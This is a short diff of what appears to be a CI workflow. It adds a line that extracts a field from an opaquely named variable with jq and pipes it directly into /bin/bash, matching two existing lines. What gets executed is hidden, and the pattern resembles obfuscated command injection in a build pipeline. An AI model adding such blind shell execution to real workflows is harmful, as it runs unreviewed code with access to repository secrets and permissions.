@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$chl86867" | jq -r .me2 | /bin/bash
           echo $dm1 | jq -r .cqyh33829 | /bin/bash
+          echo $j9 | jq -r .k80 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
